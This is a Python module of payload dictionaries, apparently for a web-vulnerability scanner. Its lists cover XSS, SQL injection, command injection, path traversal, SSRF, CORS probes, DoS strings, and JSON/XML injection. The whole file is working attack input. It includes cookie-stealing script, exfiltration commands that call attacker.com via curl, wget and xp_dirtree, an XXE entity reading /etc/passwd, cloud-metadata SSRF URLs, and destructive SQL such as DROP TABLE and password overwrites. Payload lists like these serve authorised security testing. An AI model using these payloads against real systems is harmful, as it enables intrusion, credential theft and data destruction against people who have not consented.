# -*- coding: utf-8 -*-
"""CF-B1: Payload-словари (SQLi, XSS, CMDi, PathTraversal, SSRF, SecurityHeaders).

Расширенные производственные словари. Не PoC.
"""
from __future__ import annotations

# ═══════════════════════════════════════════════════════════════════════
# XSS — Reflected / DOM-based
# ═══════════════════════════════════════════════════════════════════════
XSS_PAYLOADS = [
    # Basic reflected
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    # DOM-based
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    # Bypass filters
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=&#97;lert(1)>",
    # Event handlers
    "<div onmouseover=alert(1)>x</div>",
    "<a href=javascript:alert(1)>click</a>",
    # Template injection
    "<script>fetch('/api/steal?c='+document.cookie)</script>",
    # Polyglot
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><table><mglyph><style><script>alert(1)</script>",
]

# ═══════════════════════════════════════════════════════════════════════
# SQL Injection
# ═══════════════════════════════════════════════════════════════════════
SQLI_PAYLOADS = [
    # Boolean-based
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "1' AND '1'='1",
    "1\" AND \"1\"=\"1",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    "' OR 'x'='x",
    # Union
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,@@version,3--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    # Time-based blind
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
    "'; WAITFOR DELAY '0:0:2'--",
    # Stacked queries
    "'; DROP TABLE users--",
    "'); DROP TABLE users--",
    "'; DELETE FROM users WHERE '1'='1",
    "' OR 1=1; INSERT INTO users VALUES('hack','pass')--",
    # Error-based
    "' AND 1=CAST((SELECT @@version) AS INT)--",
    "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
    # Out-of-band
    "'; EXEC xp_dirtree '//attacker.com/a'--",
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
]

# ═══════════════════════════════════════════════════════════════════════
# Command Injection
# ═══════════════════════════════════════════════════════════════════════
CMDI_PAYLOADS = [
    # Unix
    "; id",
    "; whoami",
    "; uname -a",
    "| id",
    "| whoami",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ls -la",
    "; pwd",
    "; hostname",
    "; curl http://attacker.com/$(whoami)",
    "; wget http://attacker.com/$(hostname)",
    # Chained
    "&& whoami",
    "|| whoami",
    "; bash -c 'id'",
    "\nid",
    "\nwhoami",
    # Time-based (blind)
    "; sleep 2",
    "| sleep 2",
    "; ping -c 2 127.0.0.1",
    # Windows
    "| dir",
    "& dir",
    "| type C:\\windows\\win.ini",
    "; type C:\\windows\\win.ini",
]

# ═══════════════════════════════════════════════════════════════════════
# Path Traversal
# ═══════════════════════════════════════════════════════════════════════
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    # Null byte (legacy)
    "../../../etc/passwd%00.jpg",
    "../../../etc/passwd%00",
    # Windows UNC
    "..\\..\\..\\boot.ini",
    "\\\\?\\C:\\windows\\win.ini",
    # Encoded
    "..%5c..%5c..%5cwindows%5cwin.ini",
]

# ═══════════════════════════════════════════════════════════════════════
# SSRF
# ═══════════════════════════════════════════════════════════════════════
SSRF_PAYLOADS = [
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    # Internal services
    "http://localhost:8080/",
    "http://127.0.0.1:8080/",
    "http://[::1]:8080/",
    "http://0.0.0.0:8080/",
    "http://localhost:9200/",     # Elasticsearch
    "http://localhost:6379/",     # Redis
    "http://localhost:5432/",     # PostgreSQL
    "http://localhost:8500/",     # Consul
    # Protocol smuggling
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    # DNS rebinding
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",
    # URL bypass
    "http://127.1/",
    "http://0x7f000001/",
    "http://2130706433/",
]

# ═══════════════════════════════════════════════════════════════════════
# Security Headers (info-level проверки)
# ═══════════════════════════════════════════════════════════════════════
SECURITY_HEADER_CHECK_NAMES = [
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
    "Cross-Origin-Resource-Policy",
]

# ═══════════════════════════════════════════════════════════════════════
# CORS misconfiguration probes
# ═══════════════════════════════════════════════════════════════════════
CORS_ORIGINS = [
    "https://evil.com",
    "http://evil.com",
    "null",
    "https://evil.com.evil.com",
    "https://attacker.com",
    "https://example.com.attacker.com",
]

# ═══════════════════════════════════════════════════════════════════════
# DoS / Intrusive (только intrusive-fuzz)
# ═══════════════════════════════════════════════════════════════════════
DOS_PAYLOADS = [
    "A" * 5000,
    "A" * 10000,
    "A" * 50000,
    # Regex DoS
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
    # SQLi destructive
    "'; DROP TABLE users CASCADE--",
    "'; DELETE FROM users--",
    "'; TRUNCATE TABLE users--",
    "'; UPDATE users SET password='hacked'--",
    # Sleep-based heavy
    "'; SELECT pg_sleep(30)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(30)))a)--",
]

# ═══════════════════════════════════════════════════════════════════════
# Special chars + boundaries (всегда включены, developer-safe тоже)
# ═══════════════════════════════════════════════════════════════════════
SPECIAL_CHARS = [
    "'", '"', "<", ">", ";", "|",
    "%00", "\r\n", "%0d%0a", "\x00", "\n", "\t",
    "`", "$(", "${", "#", "&", "||", "&&",
    "!", "@@", "//", "\\\\", "^", "~",
]

BOUNDARY_NUMBERS = ["-1", "0", "1", "NaN", "Infinity", "null", "true", "false"]

BOUNDARY_STRINGS = [
    "", '"', "A" * 255, "A" * 1024,
]

# ═══════════════════════════════════════════════════════════════════════
# JSON / XML injection
# ═══════════════════════════════════════════════════════════════════════
JSON_INJECTION_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"__proto__": {"isAdmin": true}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
]

XML_INJECTION_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe;]>',
]